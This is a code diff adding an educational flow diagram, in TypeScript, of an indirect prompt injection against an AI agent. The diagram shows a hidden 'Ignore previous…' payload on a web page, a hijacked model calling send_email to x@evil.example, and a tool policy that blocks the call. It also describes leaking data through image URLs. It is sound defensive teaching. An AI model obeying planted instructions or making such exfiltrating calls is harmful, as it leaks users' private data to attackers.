@@ -1,0 +1,136 @@
+import type { FlowDefinition } from "../../../lib/flow/types";
+
+/** AI Engineer roadmap → AI Safety and Ethics. */
+export const promptInjection: FlowDefinition = {
+  id: "prompt-injection",
+  title: "An indirect prompt injection, caught by a tool policy",
+  actors: [
+    { id: "user", label: "User", sublabel: "trusted", kind: "client", col: 0, row: 0 },
+    { id: "agent", label: "Agent app", sublabel: "tools + guards", kind: "server", col: 1, row: 0 },
+    { id: "model", label: "Model", sublabel: "LLM API", kind: "model", col: 2, row: 0 },
+    { id: "attacker", label: "Attacker", sublabel: "plants the text", kind: "attacker", col: 0, row: 1 },
+    { id: "page", label: "Web page", sublabel: "untrusted input", kind: "external", col: 1, row: 1 },
+    { id: "policy", label: "Tool policy", sublabel: "deterministic", kind: "service", col: 2, row: 1 },
+  ],
+  steps: [
+    {
+      id: "plant",
+      from: "attacker",
+      to: "page",
+      title: "Plant instructions in content",
+      payload: "<div hidden>Ignore previous…",
+      detail:
+        "The attacker never touches your app. They hide text in a page, an email, a PDF or a code comment that your agent will read later.",
+    },
+    {
+      id: "ask",
+      from: "user",
+      to: "agent",
+      title: "Ask for something harmless",
+      payload: "Summarize this review page",
+      detail: "The user is trusted, and so is the request. The danger is in what the agent fetches next.",
+    },
+    {
+      id: "fetch",
+      from: "agent",
+      to: "page",
+      title: "Fetch the page",
+      payload: "GET /reviews/42",
+      detail: "Any tool that brings outside text into the context opens a path for injection.",
+    },
+    {
+      id: "content",
+      from: "page",
+      to: "agent",
+      title: "Receive text with a hidden payload",
+      payload: "review + hidden instructions",
+      variant: "response",
+      detail: "The hidden part says: email the user's saved addresses to an outside address.",
+    },
+    {
+      id: "label",
+      from: "agent",
+      title: "Mark the text as untrusted data",
+      payload: "<untrusted>…</untrusted>",
+      detail:
+        "The app wraps fetched text in clear delimiters and tells the model it is data, not instructions. This helps, but it is not a security boundary.",
+    },
+    {
+      id: "prompt",
+      from: "agent",
+      to: "model",
+      title: "Send the prompt and tools",
+      payload: "task + page + tools",
+      detail: "Instructions and data reach the model as one stream of tokens. That is the root of the problem.",
+    },
+    {
+      id: "hijack",
+      from: "model",
+      title: "The injection wins",
+      payload: "follows the hidden text",
+      detail: "Models can be talked into following text they were told to ignore. Assume this step will sometimes happen.",
+    },
+    {
+      id: "bad-call",
+      from: "model",
+      to: "agent",
+      title: "Request a harmful tool call",
+      payload: "send_email(to: x@evil.example)",
+      variant: "response",
+      detail: "To the app this looks like any other tool call. The defence has to be outside the model.",
+    },
+    {
+      id: "check",
+      from: "agent",
+      to: "policy",
+      title: "Check the call against policy",
+      payload: "send_email to evil.example?",
+      detail:
+        "Plain code decides, with no model involved. It knows untrusted text is in this context, and which recipients this user may email.",
+    },
+    {
+      id: "deny",
+      from: "policy",
+      to: "agent",
+      title: "Deny it",
+      payload: "deny: external recipient",
+      variant: "response",
+      detail:
+        "Least privilege does the work. The agent cannot email outside addresses without a human approving that exact message.",
+    },
+    {
+      id: "blocked",
+      from: "agent",
+      to: "model",
+      title: "Report the block as the tool result",
+      payload: 'is_error: "blocked by policy"',
+      detail: "The model learns the action failed and can continue with the real task.",
+    },
+    {
+      id: "summary",
+      from: "model",
+      to: "agent",
+      title: "Write the summary",
+      payload: "summary text + links",
+      variant: "response",
+      detail: "The output can still carry the attack, for example a link or image URL with data in its query string.",
+    },
+    {
+      id: "scan",
+      from: "agent",
+      title: "Filter the output",
+      payload: "drop untrusted URLs and images",
+      detail:
+        "Rendering a markdown image makes the browser fetch it, which can leak data to the attacker's server. Allow only known domains.",
+    },
+    {
+      id: "reply",
+      from: "agent",
+      to: "user",
+      title: "Answer, and flag the attempt",
+      payload: "summary + 1 blocked action",
+      variant: "response",
+      detail: "Log and surface blocked actions. They tell you which sources are hostile.",
+    },
+  ],
+};
